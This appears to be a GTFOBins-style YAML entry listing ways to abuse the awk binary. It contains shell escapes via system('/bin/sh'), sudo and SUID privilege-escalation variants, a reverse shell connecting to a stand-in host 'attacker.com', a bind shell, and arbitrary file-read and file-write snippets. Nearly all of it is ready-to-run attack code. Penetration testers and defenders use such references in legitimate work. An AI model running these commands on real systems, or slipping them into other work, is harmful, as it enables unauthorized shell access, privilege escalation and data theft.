---
functions:
  execute-interactive:
    - code: awk 'BEGIN {system("/bin/sh")}'
  sudo-enabled:
    - code: sudo awk 'BEGIN {system("/bin/sh")}'
  suid-limited:
    - code: ./awk 'BEGIN {system("/bin/sh")}'
  reverse-shell-non-interactive:
    - description: Run `nc -l -p 12345` on the attacker box to receive the shell.
      code: |
        RHOST=attacker.com
        RPORT=12345
        awk -v RHOST=$RHOST -v RPORT=$RPORT 'BEGIN {
            s = "/inet/tcp/0/" RHOST "/" RPORT;
            while (1) {printf "> " |& s; if ((s |& getline c) <= 0) break;
            while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'
  bind-shell-non-interactive:
    - description: Run `nc target.com 12345` on the attacker box to connect to the shell.
      code: |
        LPORT=12345
        awk -v LPORT=$LPORT 'BEGIN {
            s = "/inet/tcp/" LPORT "/0/0";
            while (1) {printf "> " |& s; if ((s |& getline c) <= 0) break;
            while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'
  file-read:
    - code: |
        LFILE=file_to_read
        awk '//' "$LFILE"
  file-write:
    - code: |
        LFILE=file_to_write
        awk -v LFILE=$LFILE 'BEGIN { print "data" > LFILE }'
---
